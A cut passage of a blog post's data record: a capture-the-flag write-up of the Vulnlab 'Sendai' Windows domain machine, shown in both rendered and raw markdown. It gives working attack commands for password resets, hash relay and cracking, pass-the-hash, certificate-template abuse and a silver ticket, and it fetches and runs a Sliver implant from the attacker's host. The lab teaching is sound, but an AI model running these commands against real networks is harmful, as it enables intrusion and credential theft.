retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106[...snip...]8d087a\n```\n\nNow that we have the NT hash for the Administrator user, we can simply use PTH with `evil-winrm` to authenticate to the machine.\n\n```\n└─$ evil-winrm --ip 10.10.98.227 -u 'Administrator' -H 'cfb106[...snip...]be8d087a'\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat ..\\Desktop\\root.txt\nVL[...snip...]\n```\n\nGiven that we have read the root flag, we have now successfully compromised the machine using this method!\n\n# PrivEsc Method #2 - MSSQL\n\nI was also able to discover another method for privilege escalation on the machine, this attack being through MSSQL. If you'll notice in the `Users` directory, there seems to be another user on the machine.\n\n```\n*Evil-WinRM* PS C:\\users> ls\nDirectory: C:\\users\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         7/18/2023   6:09 AM                Administrator\nd-----          7/6/2024   8:12 PM                mgtsvc$\nd-r---         7/11/2023  12:36 AM                Public\nd-----          7/6/2024   8:05 PM                sqlsvc\n```\n\nThere seems to be a `sqlsvc` account, hinting that there may be an MSSQL service running on this machine. Let's do a `netstat` scan to see if our theory is correct.\n\n```\n*Evil-WinRM* PS C:\\users> netstat -a\nActive Connections\nProto  Local Address          Foreign Address        State\n......\n  TCP    0.0.0.0:1433           dc:0                   LISTENING\n```\n\nAs you can see, an MSSQL service is indeed running on the machine.\n\nWhat's interesting as well is that, during my initial enumeration of the filesystem, I found an interesting file that might hint towards an attack on MSSQL.\n\n```\n*Evil-WinRM* PS C:\\config> ls\nDirectory: C:\\config\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         7/11/2023   5:57 AM             78 .sqlconfig\n\n*Evil-WinRM* PS C:\\config> cat .sqlconfig\nServer=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=[...snip...];\n```\n\nWe seem to have found a configuration file underneath `C:\\config`, which is also hosted as an SMB share - although you won't have access to this share until you get access to `mgtsvc$`.\n\nNow that we have a password for `sqlsvc`, what exactly can we do with this? At this point it would make sense to authenticate to their account using WinRM, however they are not a part of the `Remote Management Operators`. You will notice that they do have an SPN to MSSQL within Bloodhound.\n\n![](/images/vulnlab/sendai-vl/i.png)\n\nAt this point, I immediately thought back to what we had done for [Breach](https://dan-feliciano.com/2024/06/29/breach/). Given that we have the plaintext password for an account that has an SPN set to MSSQL (which seems to be the MSSQL service account), we can potentially exploit a [Silver ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket).\n\nWith the silver ticket attack, we can gain command execution access through MSSQL by impersonating the Administrator user. Let's first start up [Sliver C2](https://github.com/BishopFox/sliver) and set up a SOCKS proxy, as the MSSQL service is not externally facing and is behind a firewall (since we didn't see it on our initial NMAP scan).\n\n```\nsliver > mtls\nsliver > generate --mtls (KALI IP) --os windows --arch amd64 --format exe --save (SAVE PATH) --name sendai\n```\n\nLet's then execute the Sliver implant to receive a session on our Sliver server - to which we can start a SOCKS proxy on.\n\n```\n*Evil-WinRM* PS C:\\temp> curl http://10.8.0.173:9001/sendai.exe -O sendai.exe\n*Evil-WinRM* PS C:\\temp> .\\sendai.exe\n\n[*] Session 9976dc7b sendai - 10.10.98.227:60658 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:24:25 EDT\n\nsliver > use 9976dc7b-addd-44c8-9ac1-b8960b009c67\n\n[*] Active session sendai (9976dc7b-addd-44c8-9ac1-b8960b009c67)\n\nsliver (sendai) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081  \n⚠  In-band SOCKS proxies can be a little unstable depending on protocol\n```\n\nNow that we have a SOCKS proxy running, make sure to update `/etc/proxychains4.conf` at the bottom of the file to reflect the interface (`127.0.0.1`) and the port (`1081`) that the proxy is listening on.\n\nWe can then use `proxychains4` to execute commands through the firewall.\n\n```\n└─$ proxychains4 nmap -sT -p1433 10.10.98.227         \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nNmap scan report for sendai.vl (10.10.98.227)\nHost is up (0.26s latency).\n\nPORT     STATE SERVICE\n1433/tcp open  ms-sql-s\n\nNmap done: 1 IP address (1 host up) scanned in 0.52 seconds\n```\n\nNow that we have access to the MSSQL ticket, we'll need to craft our Silver ticket in order to authenticate as the Administrator user.\n\nIn order to do this, we'll need a few objects relative to domain identification.\n\n* The domain SID - `S-1-5-21-3085872742-570972823-736764132` (Can be found in Bloodhound).\n* The NT Hash of the SQL service account - (Can be crafted using web tools like [this](https://codebeautify.org/ntlm-hash-generator) along with SQLSVC's plaintext password).\n* The SPN our service account has - `MSSQL/dc.sendai.vl`.\n* The name of the user we want to impersonate - Administrator.\n\nPutting this all together, you should receive a command similar to the below.\n\n```\n└─$ proxychains4 impacket-ticketer -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash 58655C0[...snip...]78C2D96A -spn MSSQL/dc.sendai.vl -dc-ip 10.10.98.227 -domain sendai.vl Administrator\n......\n[*] Saving ticket in Administrator.ccache\n```\n\nWe can then set our Kerberos authentication global variable on Kali to be directed to the ticket file that was generated. This will then be followed by our authentication attempt into MSSQL through our proxy.\n\n```\n└─$ export KRB5CCNAME=Administrator.ccache\n\n└─$ proxychains4 impacket-mssqlclient -k dc.sendai.vl\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  dc.sendai.vl:1433  ...  OK\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (SENDAI\\Administrator  dbo@master)> \n```\n\nNow that we are authenticated to MSSQL in the context of Administrator (we still only have the privileges of `SQLSVC`), we can enable command execution using the `enable_xp_cmdshell` tool that comes built into this client.\n\n```\nSQL (SENDAI\\Administrator  dbo@master)> enable_xp_cmdshell\n[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\n[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\n```\n\nLet's now run `xp_cmdshell` to execute local commands and execute our Sliver implant we put on the filesystem earlier.\n\n```\nSQL (SENDAI\\Administrator  dbo@master)> xp_cmdshell powershell \"cd C:\\temp; .\\sendai.exe\"\n```\n\n![](/images/vulnlab/sendai-vl/j.png)\n\n# PrivEsc Method #2 (cont.) - SeImpersonatePrivilege\n\nNow that we have a session as `SQLSVC`, we'll find that they have `SeImpersonatePrivilege` enabled on their account. I've covered this before, however I'll just give a brief overview as to how it works.\n\n```\nsliver (sendai) > sa-whoami\n\n[*] Successfully executed sa-whoami (coff-loader)\n[*] Got output:\n......\n\nPrivilege Name                Description                                       State                         \n============================= ================================================= ===========================\nSeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      \nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      \nSeMachineAccountPrivilege     Add workstations to domain                        Disabled                      \nSeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       \nSeManageVolumePrivilege       Perform volume maintenance tasks                  Enabled                       \nSeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       \nSeCreateGlobalPrivilege       Create global objects                             Enabled                       \nSeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled\n```\n\nService accounts, by default, will have this privilege along with `SeAssignPrimaryTokenPrivilege`. Having `SeImpersonatePrivilege` essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.\n\nWe can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM. If we direct this towards our implant, we should be able to receive a Sliver session as SYSTEM.\n\nYou can use any binaries within the Potato family for our exploit to force SYSTEM to authenticate to our endpoint. In the past, I've used [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) due to AV restrictions, however that is not the case here as AV is not enabled on this machine. I'll use [SweetPotato](https://github.com/CCob/SweetPotato) in our case, since I already have it compiled with Visual Studio on my machine.\n\nWe can execute this through Sliver's built-in .NET assembly command tools.\n\n```\nsliver (sendai) > execute-assembly SweetPotato.exe '-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"C:\\temp\\sendai.exe\" -e EfsRpc'\n\n[*] Output:\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b54f2ec8-c934-40f1-885c-2b715199b7af/\\b54f2ec8-c934-40f1-885c-2b715199b7af\\b54f2ec8-c934-40f1-885c-2b715199b7af\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\n[*] Session 4afdd3a6 sendai - 10.10.98.227:49917 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:47:19 EDT\n```\n\nIf all was done correctly, this should generate a Sliver callback session as SYSTEM as it did for me denoted above. Since we have an account as SYSTEM, we can now essentially control the machine as we'd like. We can dump all of the domain user hashes and secrets, establish persistence through services, etc.\n\nSince we have access as SYSTEM though, we can read the root flag of this machine. This means we have successfully compromised this machine using this method!\n\n```\nsliver (sendai) > cat \"C:\\Users\\Administrator\\Desktop\\root.txt\"\n\nVL[...snip...]\n```\n\n![](/images/vulnlab/sendai-vl/k.png)\n\n# Conclusion\n\nThis machine was an incredible environment that helped me bounce off of tactics that I had actually learned in previous Vulnlab machines. Using ADCS or creating a Silver ticket through MSSQL is something that I've done before, and it was really great to be able to put that same knowledge into this machine. There could potentially be other methods that I am not aware about, but nonetheless I think I'm satisfied with the work that I've done for Sendai.\n\nBig thanks goes out to xct for the development of this machine and for the continued practice with red teaming.\n\n# Resources\n\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/dirkjanm/krbrelayx\nhttps://github.com/GhostPack/Seatbelt\nhttps://github.com/itm4n/PrivescCheck\nhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\nhttps://github.com/GhostPack/Certify\nhttps://github.com/GhostPack/Rubeus\nhttps://github.com/ly4k/Certipy\nhttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\nhttps://github.com/BishopFox/sliver\nhttps://codebeautify.org/ntlm-hash-generator\nhttps://github.com/bugch3ck/SharpEfsPotato\nhttps://github.com/CCob/SweetPotato","source":"_posts/sendai.md","raw":"---\ntitle: Sendai - Vulnlab\ndate: 2024-07-07 01:45:13\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Sendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I'll go over two methods that I was able to perform for both foothold and privilege escalation. I'm guessing that we'll see many similar tactics to the AD boxes that I've completed before.\ncover: /images/vulnlab/sendai-vl/sendai_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nSendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I'll go over two methods that I was able to perform for both foothold and privilege escalation. I'm guessing that we'll see many similar tactics to the AD boxes that I've completed before.\n\n# Enumeration\n\nLet's first start out with our NMAP scan of the machine.\n\n```\n└─$ sudo nmap 10.10.98.227 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 10:53 EDT\nNmap scan report for sendai.vl (10.10.98.227)\nHost is up (0.11s latency).\nNot shown: 986 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 7.27 seconds\n```\n\nWe see a couple ports open such as SMB and LDAP, along with an HTTP server running on port 80.\n\nThe HTTP server seems to be a bare IIS website, meaning there isn't a direct service that we can exploit at this moment.\n\n![](/images/vulnlab/sendai-vl/b.png)\n\nI ran a `gobuster` scan against the web service for about a minute to see if there were any directories we could find, though came back with no results that we can access right now.\n\n```\n└─$ gobuster dir -u http://10.10.98.227 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.98.227\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/service              (Status: 301) [Size: 151] [--> http://10.10.98.227/service/]\n```\n\nA `/service` directory does come back valid, though it does not seem that we currently have access to the page (403 Access Denied). I've seen directories like this in my time doing [Lustrous](https://dan-feliciano.com/2024/06/05/lustrous/), which involved using Kerberos authentication to access websites that we previously did not have access to. Since there seems to be no other way to authenticate with user input, I'll make the guess that this will be part of the attack path later down the line.\n\n# Resetting Expired Passwords\n\nLet's take a look at SMB to see if there are any shares that we can access.\n\n```\n└─$ smbclient -L 10.10.98.227 -N        \n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nconfig          Disk      \nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nsendai          Disk      company share\nSYSVOL          Disk      Logon server share \nUsers           Disk\n```\n\nWe seem to have access to a few shares, and the SMB login allows null authentication.\n\nIf you do some enumeration into these shares, you'll notice that we only have access to `sendai` and `Users`. The `Users` share just contains the directories of the `Default` and `Public` directories, meaning this specific share is only hosting those User folders within `C:\\Users` on the remote computer. The `sendai` share however contains a multitude of folders, specifically containing an interesting file at its root folder.\n\n```\nsmb: \\> ls\n  .                                   D        0  Tue Jul 18 13:31:04 2023\n  ..                                DHS        0  Wed Jul 19 10:11:25 2023\n  hr                                  D        0  Tue Jul 11 08:58:19 2023\n  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023\n  it                                  D        0  Tue Jul 18 09:16:46 2023\n  legal                               D        0  Tue Jul 11 08:58:23 2023\n  security                            D        0  Tue Jul 18 09:17:35 2023\n  transfer                            D        0  Tue Jul 11 09:00:20 2023\n\n7309822 blocks of size 4096. 604434 blocks available\nsmb: \\> get incident.txt\ngetting file \\incident.txt of size 1372 as incident.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)\n```\n\n![](/images/vulnlab/sendai-vl/c.png)\n\nIt seems as though there is a notice about poor password management/usage within the environment, specifically from the domain users. Aside from this, the note also tells us that all users that have had their passwords reset have been expired as of where we are now.\n\nGiven that a few users may have their passwords reset, we can test whether or not any of them have a null password (indicating a user with an expired password). However - we'll need a user list in order to do so. Luckily enough - since we have null authentication to SMB, we can essentially enumerate all of the domain users using a tool such as `lookupsid`. This will brute force all of the domain SIDs of all objects within the domain that have a max RID value below 4000(we can increase this RID value, though its not needed for this machine).\n\n```\nimpacket-lookupsid sendai.vl/'temp'@10.10.98.227 -no-pass -domain-sids | cut -d '\\' -f 2 | awk 'NR >= 31 {print $1}' > full_ul.txt\n```\n\nI've done the needful and converted all of the domain users into a wordlist. Let's now test for any users that have an expired password.\n\n```\n└─$ crackmapexec smb 10.10.98.227 -u full_ul.txt -p '' --continue-on-success\n[-] sendai.vl\\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE\n[-] sendai.vl\\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE\n```\n\nYou'll receive a few false positives from users such as `admsvc` or `staff`, and this is due to the fact that these aren't legitimate domain users. Since they aren't domain users, SMB falls back on its null authentication for these usernames - meaning they would work regardless.\n\nAs noted from the code snippet above, it seems as though `Elliot.Yates` and `Thomas.Powell` both have their passwords reset.\n\nWe can reset these passwords using Impacket's built-in `smbpasswd` tool, which will reset the passwords of the users we give it.\n\n```\n└─$ impacket-smbpasswd sendai.vl/'Elliot.Yates'@10.10.98.227 -newpass 'Password123@'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n===============================================================================\n  Warning: This functionality will be deprecated in the next Impacket version  \n===============================================================================\n\nCurrent SMB password: \n[!] Password is expired, trying to bind with a null session.\n[*] Password was changed successfully.\n```\n\nWe can then test the users authentication to LDAP using `crackmapexec`.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'Elliot.Yates' -p 'Password123@'              \nSMB         10.10.98.227   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227   389    DC               [+] sendai.vl\\Elliot.Yates:Password123@\n```\n\nNow that we have a valid user in LDAP, let's dump the domain using Bloodhound along with its [Python ingestor](https://github.com/dirkjanm/BloodHound.py).\n\n```\n└─$ bloodhound-python -d 'sendai.vl' -u 'Elliot.Yates' -p 'Password123@' -c all -ns 10.10.98.227 --zip\n```\n\n# MGTSVC Method #1 - LDAP\n\nAt this point, there are two methods that you can use to get user. The intended path is to go through LDAP in order to escalate privileges, however there is also a web-focused path that I will cover after the intended.\n\nIf you take a look over at Bloodhound, you'll notice that our user `Elliot.Yates` has an interesting outbound object control.\n\n![](/images/vulnlab/sendai-vl/d.png)\n\nIt seems that we are apart of the `Support` domain group. Due to us being within the `Support` domain group, we are automatically given the right to have `GenericAll` over the `admsvc` domain group. I've had this privilege before, however it's mainly been on either domain user or domain computers. The difference here is that this privilege is against a group - though it can also allow us to add our current user to that group.\n\nWe can do so by using the default RPC package that comes built-in with Kali. This tool, `net rpc`, can allow us to modify the domain group and add ourselves to it.\n\n```\n└─$ net rpc group addmem \"admsvc\" \"Elliot.Yates\" -U sendai.vl/\"Elliot.Yates\"%\"Password123@\" -S dc.sendai.vl\n```\n\nWe can then verify that the change has been made with the same tool.\n\n```\n└─$ net rpc group members \"admsvc\" -U \"sendai.vl\"/\"Elliot.Yates\"%\"Password123@\" -S dc.sendai.vl\nSENDAI\\websvc\nSENDAI\\Norman.Baxter\nSENDAI\\Elliot.Yates\n```\n\nAs you can see, we were added to the group successfully. Looking into these group members domain privileges, we can see that users within this group has a specific outbound object control as well.\n\n![](/images/vulnlab/sendai-vl/e.png)\n\nUsers within the `admsvc` group have the `ReadGMSAPassword` over the `MGTSVC$` account. This privilege allows us to view the Group-Managed Service Account (GMSA) password of the support account, which will return to us the NT hash of the account.\n\nCrackmapexec has a handle for this, so we can easily do it with `Elliot.Yates` credentials.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'Elliot.Yates' -p 'Password123@' --gmsa           \nSMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227    636    DC               [+] sendai.vl\\Elliot.Yates:Password123@ \nLDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords\nLDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece1a9[...snip...]a44c1a20\n```\n\nI verified that the `MGTSVC$` account has WinRM access through Bloodhound, as you can see that it is a part of the `Remote Management Users` group.\n\n```\n└─$ evil-winrm --ip 10.10.98.227 -u 'mgtsvc$' -H '52ece[...snip...]4c1a20'\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents> whoami\nsendai\\mgtsvc$\n```\n\nThis means we have successfully completed the first half of the machine. The first user flag is within `C:\\`.\n\n# MGTSVC Method #2 - WebSVC\n\nThis second method I discovered, credit goes out to Yeeb for this specific attack path.\n\nIf we run a `gobuster` scan against the HTTP service, you'll notice that an interesting endpoint that we can't see on the main HTTP page of the domain.\n\n```\n└─$ gobuster vhost --url https://sendai.vl -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k --exclude-length 334 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:              https://sendai.vl\n[+] Method:           GET\n[+] Threads:          50\n[+] Wordlist:         /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:       gobuster/3.6\n[+] Timeout:          10s\n[+] Append Domain:    true\n[+] Exclude Length:   334\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nFound: service.sendai.vl Status: 200 [Size: 4189]\n```\n\nBrowsing to this subdomain (after editing it into our `/etc/hosts` file) will lead us to the DownDetector.\n\n![](/images/vulnlab/sendai-vl/f.png)\n\nThis website seems to be an internal website scan, which will verify if a subdomain within the environment is experiencing issues. It seems as though this requires no authentication, however its usability can be severe.\n\nIt allows us to prompt a subdomain to check, meaning this website will probably submit an LDAP request to the subdomain that we specify. What's great is that we actually have the ability to create a fake subdomain due to `Elliot.Yates` Machine Account Quota (MAQ). This let's us create a computer account, to which we can use to create an LDAP record of a fake subdomain that points back to our attacker machine. If there is a service account associated with this web service, we can capture their NetNTLMv2 hash using `responder`.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'Elliot.Yates' -p 'Password123@' -M maq\nSMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227    389    DC               [+] sendai.vl\\Elliot.Yates:Password123@ \nMAQ         10.10.98.227    389    DC               [*] Getting the MachineAccountQuota\nMAQ         10.10.98.227    389    DC               MachineAccountQuota: 10\n```\n\nIt isn't necessarily needed for us to create a computer account for this attack, as all we need to do is create the fake LDAP record. It is odd though how we have a MAQ of 10, and given that this is what I'm used to doing - I decided to set up a domain computer account anyways.\n\nLet's first start with creating the domain computer.\n\n```\n└─$ impacket-addcomputer -dc-ip 10.10.98.227 -computer-name daz -computer-pass 'Password123@' sendai.vl/Elliot.Yates:'Password123@'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Successfully added machine account daz$ with password Password123@.\n```\n\nWe can then use `dnstool.py` in the [KrbRelayX](https://github.com/dirkjanm/krbrelayx) library to create the fake LDAP record, using our new computer account credentials.\n\n```\n└─$ python3 krbrelayx/dnstool.py -u 'sendai.vl\\daz$' -p 'Password123@' -r daz.sendai.vl -d 10.8.0.173 --action add dc.sendai.vl -dns-ip 10.10.98.227\n[-] Connecting to host...\n[-] Binding to host\n[+] Bind OK\n[-] Adding new record\n[+] LDAP operation completed successfully\n```\n\nYou'll need to wait a few minutes for the LDAP record to update into the environment, it took around 5 minutes for me. We'll boot up `responder` to wait for incoming LDAP requests to our attacker machine.\n\n```\n└─$ sudo responder -I tun0      \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.4.0\n```\n\nAfter we've waited long enough, we should be able to submit a request to our controlled subdomain into DownDetector. You may receive an error, however if we look back at `responder` you'll see that an NTLM hash was captured.\n\n```\n[+] Listening for events...                                                                                                   \n\n[HTTP] NTLMv2 Client   : 10.10.98.227\n[HTTP] NTLMv2 Username : SENDAI\\websvc\n[HTTP] NTLMv2 Hash     : websvc::SENDAI:7ddba3792facbeff:2B[...snip...]00000000000000\n```\n\nWe can crack this hash using `hashcat`, to which we'll be using a hash identifier value of 5600.\n\n```\n└─$ hashcat -a 0 -m 5600 websvc.txt /usr/share/wordlists/rockyou.txt\n......\n2366e65c8e9a29435777b0a001000000000000000000000000000000000000900240048005400540050002f00640061007a002e00730065006e006400610069002e0076006c000000000000000000:[...snip...]\n   \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\n```\n\nAs you can see, we were successfully able to crack the hash for `websvc`. Looking back at Bloodhound, we can see that this user is within the `admsvc` group along with the `Elliot.Yates` user that we added to in Method #1.\n\n![](/images/vulnlab/sendai-vl/g.png)\n\nThis means we can also use `crackmapexec` along with `websvc` creds to read the GMSA password and get the NT hash for `mgtsvc$`.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'websvc' -p '(WEBSVC PASSWORD)' --gmsa          \nSMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227    636    DC               [+] sendai.vl\\websvc:[...snip...] \nLDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords\nLDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece[...snip...]4c1a20\n```\n\nWe can then use the `mgtsvc$` NT hash to authenticate to WinRM using PTH.\n\n```\n└─$ evil-winrm --ip 10.10.98.227 -u 'mgtsvc$' -H '52ece[...snip...]4c1a20'\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents> whoami\nsendai\\mgtsvc$\n```\n\n# PrivEsc Method #1 - PrivEscCheck\n\nIf you may have noticed before, ADCS is running on the machine. This can be assumed due to the `ca-operators` domain group within the environment, and also due to the fact that port 9389 is running (this isn't conclusive, but generally I've seen this port open with machines running ADCS).\n\nThe only issue is that we do not currently possess the capabilities to retrieve vulnerable ADCS templates, as we do not control a user account within the `ca-operators` group.\n\n![](/images/vulnlab/sendai-vl/h.png)\n\nWe'll need to take control of either `Anthony.Smith` or `Clifford.Davey` in order to exploit ADCS. If you scan for vulnerable ADCS templates using any of the domain accounts we have access to, you won't find any vulnerable templates (at least to what I could see).\n\nGiven that we have access to the filesystem at this point, my assumption is that we'll need to do a bit of credential hunting.\n\nMy normal attack methodology would be to look through odd files or potentially cached DPAPI credentials with tools like [Seatbelt](https://github.com/GhostPack/Seatbelt), however I discovered an odd service that was running on the machine when I ran a scan with `ps`.\n\n```\nsliver (sendai) > ps\n\n Pid    Ppid   Owner            Arch     Executable                                  Session \n====== ====== ================ ======== =========================================== =========\n......\n2584   628                              helpdesk.exe                                -1\n```\n\nThis executable doesn't seem to be ran naturally, at least in the AD environments that I've tested in the past. We can receive if any usernames or passwords were passed into this executable in memory (during the time of its execution) by using tools such as [PrivEscCheck](https://github.com/itm4n/PrivescCheck).\n\n```\n*Evil-WinRM* PS C:\\temp> Import-Module .\\PrivescCheck.ps1\n*Evil-WinRM* PS C:\\temp> Invoke-PrivescCheck\n......\nName        : Support\nDisplayName :\nImagePath   : C:\\WINDOWS\\helpdesk.exe -u clifford.davey -p [...snip...] -k netsvcs\nUser        : LocalSystem\nStartMode   : Automatic\n```\n\nAs you can see, the `helpdesk.exe` had the credentials for `Clifford.Davey` passed into them at runtime. \n\n# PrivEsc Method #1 (cont.) - ADCS\n\nWe should now have the password for this user, meaning we can properly exploit [ADCS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation). We'll use `certipy-ad` for this, though you could also exploit this locally on the machine using [Certify](https://github.com/GhostPack/Certify) alongside [Rubeus](https://github.com/GhostPack/Rubeus). The only issue with the Windows solution is that you would need to drop Certify to the filesystem which can take a bit longer.\n\nSince we have access to the domain users credentials, we'll just use `certipy-ad`, which should be built-in to Kali (in case you don't have it, check [here](https://github.com/ly4k/Certipy)). We'll start by enumerating the ADCS templates.\n\n```\n└─$ certipy-ad find -vulnerable -dc-ip 10.10.98.227 -u 'clifford.davey'@sendai.vl -p '(CLIFFORD.DAVEY PASSWORD)'\n......\n[*] Saved text output to '20240707011831_Certipy.txt'\n[*] Saved JSON output to '20240707011831_Certipy.json'\n```\n\nIf you'll notice, this should save two text files (alongside Bloodhound data) to our local system. Looking into this file gives us the indication of a potential exploit.\n\n```\nCertificate Templates\n  0\n    Template Name                       : SendaiComputer\n    Display Name                        : SendaiComputer\n    Certificate Authorities             : sendai-DC-CA\n    Enabled                             : True\n    Client Authentication               : True\n......\n[!] Vulnerabilities\nESC4                              : 'SENDAI.VL\\\\ca-operators' has dangerous permissions\n```\n\nESC4 is a vulnerability that gives us the potential to alter a template and create an exploitable misconfiguration on a section of the template. As proclaimed in the HackTricks article that I posted above, we are able to modify the template's following permissions:\n\n- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.\n- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.\n- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.\n- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.\n- **WriteProperty:** Authorizes the editing of any object properties.\n\nTo keep things at a low-level, we can essentially modify the ESC4 template to become vulnerable to ESC1. We can then exploit the ESC1 vulnerability and gain a service ticket as the Administrator user.\n\nWe'll first start by converting said template to be vulnerable to ESC4.\n\n```\n└─$ certipy-ad template -username 'clifford.davey'@sendai.vl 